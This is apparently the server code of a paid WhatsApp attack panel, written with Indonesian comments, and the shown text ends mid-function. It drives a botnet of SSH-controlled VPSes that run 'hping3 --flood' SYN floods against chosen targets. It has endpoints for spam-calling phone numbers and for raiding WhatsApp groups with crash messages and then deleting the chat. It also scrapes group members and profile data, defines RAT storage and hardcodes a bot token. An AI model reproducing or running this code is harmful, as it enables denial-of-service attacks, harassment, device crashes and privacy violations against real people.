const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "click", bug_name: "FORCLOSE ANDRO by @Myfloyrn45" },
  { bug_id: "android", bug_name: "CRASH UI" },
  { bug_id: "invisible", bug_name: "DELAY INVISIBLE" },
  { bug_id: "ios_invis", bug_name: "FC IOS INVISIBLE" },
  { bug_id: "ios_noinvis", bug_name: "CRASH IOS" },
];

// TAMBAHKAN DI BAWAHNYA:
// ============ KEAMANAN TAMBAHAN ============
const userMessageCooldown = new Map();  // Cooldown per user
const MESSAGE_COOLDOWN_MS = 3000;       // 3 detik antar pesan
const MAX_MESSAGES_PER_MINUTE = 20;     // Maks 20 pesan per menit
const messageRateLimit = new Map();      // Rate limit per menit

// Fungsi untuk cek rate limit per menit
function checkRateLimit(username) {
    const now = Date.now();
    const userRate = messageRateLimit.get(username) || { count: 0, resetTime: now + 60000 };
    
    if (now > userRate.resetTime) {
        userRate.count = 0;
        userRate.resetTime = now + 60000;
    }
    
    userRate.count++;
    messageRateLimit.set(username, userRate);
    
    return userRate.count <= MAX_MESSAGES_PER_MINUTE;
}

let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

// TAMBAHKAN FUNCTION INI DI BAWAHNYA:
function sanitizeMessage(text) {
    if (!text) return '';
    return String(text)
        .replace(/[<>]/g, '')           // Hapus HTML tags < >
        .replace(/&/g, '&amp;')         // Escape & menjadi &amp;
        .replace(/[\\x00-\\x1F\\x7F]/g, '') // Hapus control characters
        .replace(/javascript:/gi, '')   // Hapus javascript: protocol
        .replace(/on\w+=/gi, '')        // Hapus event handlers (onclick=, onload=)
        .trim()
        .substring(0, 500);             // Batasi panjang
}

// ============ RAT HELPER FUNCTIONS ============
const RAT_TARGETS = './rat_targets.json';
const RAT_COMMANDS = './rat_commands.json';
const RAT_RESPONSES = './rat_responses.json';
const RAT_NOTIFS = './rat_notifs.json';
const DEVICE_PERM_FILE = './device_perms.json';

function readRat(file) {
    try {
        if (!fs.existsSync(file)) fs.writeFileSync(file, '[]');
        return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch(e) { return []; }
}
function saveRat(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function loadDevicePerms() {
    try {
        if (!fs.existsSync(DEVICE_PERM_FILE)) fs.writeFileSync(DEVICE_PERM_FILE, '{}');
        return JSON.parse(fs.readFileSync(DEVICE_PERM_FILE, 'utf8'));
    } catch(e) { return {}; }
}
function saveDevicePerms(data) {
    fs.writeFileSync(DEVICE_PERM_FILE, JSON.stringify(data, null, 2));
}

// Inisialisasi file RAT
try {
    if (!fs.existsSync(RAT_TARGETS)) fs.writeFileSync(RAT_TARGETS, '[]');
    if (!fs.existsSync(RAT_COMMANDS)) fs.writeFileSync(RAT_COMMANDS, '[]');
    if (!fs.existsSync(RAT_RESPONSES)) fs.writeFileSync(RAT_RESPONSES, '[]');
    if (!fs.existsSync(RAT_NOTIFS)) fs.writeFileSync(RAT_NOTIFS, '[]');
    if (!fs.existsSync(DEVICE_PERM_FILE)) fs.writeFileSync(DEVICE_PERM_FILE, '{}');
    console.log("[RAT] File RAT initialized");
} catch(e) {}

const lockChats = {};

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8764546672:AAHbsxx3q4_V_F0IHkHNY8L6_9cY8aidGYE";
const bot = new TelegramBot(TOKEN, { polling: true });

const ID_GROUP = [
    -1003133749169
];

const ID_GROUP_UTAMA = [
    -1003227459096
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 8705363927;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);
      
   // Tambahkan handler untuk online/offline status
if (data.type === 'chat_online' && username) {
    let onlineUsers = loadOnlineUsers();
    const existing = onlineUsers.findIndex(u => u.username === username);
    
    if (existing !== -1) {
        onlineUsers[existing].lastActive = new Date().toISOString();
    } else {
        onlineUsers.push({
            username: username,
            lastActive: new Date().toISOString(),
            role: data.role || 'member'
        });
    }
    
    saveOnlineUsers(onlineUsers);
    
    broadcastToChatClients({
        type: 'user_online',
        username: username,
        users: onlineUsers.filter(u => (Date.now() - new Date(u.lastActive)) < 60000).length
    });
}

if (data.type === 'chat_offline' && username) {
    let onlineUsers = loadOnlineUsers();
    onlineUsers = onlineUsers.filter(u => u.username !== username);
    saveOnlineUsers(onlineUsers);
    
    broadcastToChatClients({
        type: 'user_offline',
        username: username,
        users: onlineUsers.length
    });
}

if (data.type === 'chat_leave') {
    if (username) {
        chatClients.delete(username);
        let onlineUsers = loadOnlineUsers();
        onlineUsers = onlineUsers.filter(u => u.username !== username);
        saveOnlineUsers(onlineUsers);
        broadcastToChatClients({ type: 'user_left', username, users: onlineUsers.length });
        console.log(`[CHAT] ${username} left`);
    }
}

if (data.type === 'chat_message') {
    if (username && data.message?.trim()) {
        // SANITASI pesan dari WebSocket
        const rawMessage = data.message.substring(0, 500);
        const sanitizedMsg = sanitizeMessage(rawMessage);
        
        if (!sanitizedMsg || sanitizedMsg.length === 0) {
            return; // Pesan invalid, ignore
        }
        
        // Cek cooldown untuk WebSocket juga
        const lastMsgTime = userMessageCooldown.get(username);
        const now = Date.now();
        if (lastMsgTime && (now - lastMsgTime) < MESSAGE_COOLDOWN_MS) {
            return; // Cooldown, ignore
        }
        userMessageCooldown.set(username, now);
        
        const messages = loadChatMessages();
        const newMessage = { 
            id: Date.now().toString(), 
            username, 
            message: sanitizedMsg, 
            timestamp: new Date().toISOString(),
            role: data.role || 'member'
        };
        messages.push(newMessage);
        saveChatMessages(messages);
        broadcastToChatClients({ type: 'new_message', message: newMessage });
    }
}

if (data.type === 'chat_typing' && username) {
    broadcastToChatClients({ type: 'user_typing', username, isTyping: data.isTyping || true });
}

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

        if (data.type === 'validate') {
              const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
              const validKey = session.find(e => e.sessionKey === data.key)
              const validId = session.find(e => e.androidId === data.androidId)
                
              if (!validKey) {
                ws.send(JSON.stringify({
                  type: "myInfo",
                  valid: false,
                  reason: "keyInvalid"
                }));
                return ws.close();
              }
      
              if (!validId) {
                ws.send(JSON.stringify({
                  type: "myInfo",
                  valid: false,
                  reason: "androidIdMismatch"
                }));
                return ws.close();
              }
      
              // Autentikasi sukses
              ws.send(JSON.stringify({
                type: "myInfo",
                valid: true,
                username: session.username,
                androidId: session.androidId,
                role: session.role || "member"
              }));

              // ✅ Trigger Heartbeat segera setelah sukses validasi
              try {
                startUserHeartbeat(validKey.username, data.androidId, data.key);
              } catch(e) {
                console.error('[HB] startUserHeartbeat error:', e.message);
              }
      
                  const interval = setInterval(() => {
                  const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
              const validKey = session.find(e => e.sessionKey === data.key)
              const validId = session.find(e => e.androidId === data.androidId)
                
              if (!validKey) {
                ws.send(JSON.stringify({
                  type: "myInfo",
                  valid: false,
                  reason: "keyInvalid"
                }));
                return ws.close();
              }
      
              if (!validId) {
                ws.send(JSON.stringify({
                  type: "myInfo",
                  valid: false,
                  reason: "androidIdMismatch"
                }));
                return ws.close();
              }
      
                  }, 10000);
            }
            if (data.type === 'auth') {
              username = getUserByKey(data.key);
               console.log(username)
              if (!username) return ws.close();
              wsClients[username] = ws;
      
              // Kirim chatList awal
      const list = chatList
        .filter(m => m.from === username || m.to === username)
        .map(m => (m.from === username ? m.to : m.from));
      
        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
            }
      
            if (data.type === 'chat') {
              const to = data.to;
              const message = sanitize(data.message);
      if (!username || !to || !message || message.length > 250) return;
      
              const chat = {
                from: username,
                to,
                message,
                time: new Date().toISOString()
              };
              chatList.push(chat);
              saveChat();
      
              // Kirim ke pengirim
              ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));
      
              // Kirim ke penerima jika online
              if (wsClients[to]) {
                wsClients[to].send(JSON.stringify({
                  type: 'chat',
                  message: { ...chat, fromMe: false }
                }));
              }
            }

       if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

      if (data.type === 'stats') {
        const onlineUsers = loadOnlineUsers();
        const activeConns = loadActiveConnections();
        const now = Date.now();

        const onlineNow = onlineUsers.filter(u => (now - new Date(u.lastActive).getTime()) < 60000);
        const activeNow = activeConns.filter(c => (now - new Date(c.lastActive).getTime()) < 60000);

        ws.send(JSON.stringify({
          type: "stats",
          onlineUsers: onlineNow.length,
          activeConnections: activeNow.length
        }));
      }

      if (data.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong' }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 1202;
server.listen(wsPort, () => {
  console.log(`🟣 WebSocket Server running on port ${wsPort}`);
});

const PORT = 1202;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ============ RATE LIMITER - DIPERBAIKI ============
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  // ✅ PERUBAHAN: dari 2 JADI 20
  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 24 * 60 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");
          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await fconemsg(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://i.supaimg.com/f15077c4-6d5d-4ac0-87bf-9186d4cdfa87/e8b4c675-5089-41bc-bb25-f38ce71fad36.png",
    title: "Revenge Verse",
    desc: "Admin Bukan Pedofil."
  },
  {
    image: "https://i.supaimg.com/f15077c4-6d5d-4ac0-87bf-9186d4cdfa87/e8b4c675-5089-41bc-bb25-f38ce71fad36.png",
    title: "Revenge Verse",
    desc: "Join channel @RevXteam"
  }
];

// ============ USER ACCOUNT INFO (TAMBAHAN BARU) ==========

// 1. GET MY OWN ACCOUNT INFO
app.get("/getMyAccountInfo", (req, res) => {
    const { key } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    if (!user) {
        return res.json({ valid: false, message: "User tidak ditemukan" });
    }
    
    const isExpired = new Date(user.expiredDate) < new Date();
    
    res.json({
        valid: true,
        username: user.username,
        role: user.role || 'member',
        expiredDate: user.expiredDate,
        isExpired: isExpired,
        parent: user.parent || 'SYSTEM'
    });
});

// 2. GET OTHER USER INFO (untuk admin/owner/reseller)
app.get("/getUserAccountInfo", (req, res) => {
    const { key, username } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);
    const requesterRole = requester?.role || 'member';
    
    const targetUser = db.find(u => u.username === username);
    if (!targetUser) {
        return res.json({ valid: false, message: "User tidak ditemukan" });
    }
    
    // Cek permission
    if (requester.username !== username) {
        // Reseller hanya bisa lihat member
        if (requesterRole === 'reseller' && targetUser.role !== 'member') {
            return res.json({ valid: false, message: "Reseller hanya bisa melihat member" });
        }
        // Admin hanya bisa lihat member & reseller
        if (requesterRole === 'admin' && !['member', 'reseller'].includes(targetUser.role)) {
            return res.json({ valid: false, message: "Admin hanya bisa melihat member & reseller" });
        }
        // Partner bisa lihat member, reseller, admin
        if (requesterRole === 'partner' && !['member', 'reseller', 'admin'].includes(targetUser.role)) {
            return res.json({ valid: false, message: "Partner tidak bisa melihat owner" });
        }
        // Member tidak bisa lihat orang lain
        if (requesterRole === 'member') {
            return res.json({ valid: false, message: "Member tidak bisa melihat user lain" });
        }
    }
    
    res.json({
        valid: true,
        username: targetUser.username,
        role: targetUser.role || 'member',
        expiredDate: targetUser.expiredDate,
        parent: targetUser.parent || 'SYSTEM'
    });
});

// 3. LIST ALL USERS (untuk admin ke atas)
app.get("/listAllUsers", (req, res) => {
    const { key, filterRole } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);
    const requesterRole = requester?.role || 'member';
    
    // Hanya admin, partner, owner yang bisa list users
    if (!['admin', 'partner', 'owner'].includes(requesterRole)) {
        return res.json({ 
            valid: false, 
            message: `${requesterRole} tidak bisa melihat daftar user` 
        });
    }
    
    let users = db;
    
    // Filter berdasarkan role yang boleh dilihat
    if (requesterRole === 'admin') {
        users = db.filter(u => ['member', 'reseller'].includes(u.role));
    } else if (requesterRole === 'partner') {
        users = db.filter(u => ['member', 'reseller', 'admin'].includes(u.role));
    }
    
    if (filterRole) {
        users = users.filter(u => u.role === filterRole);
    }
    
    res.json({
        valid: true,
        users: users.map(u => ({
            username: u.username,
            role: u.role || 'member',
            expiredDate: u.expiredDate,
            parent: u.parent || 'SYSTEM'
        })),
        total: users.length
    });
});

// 4. UPDATE MY PASSWORD
app.post("/updateMyPassword", (req, res) => {
    const { key, oldPassword, newPassword } = req.body;
    
    const keyInfo = activeKeys[key];
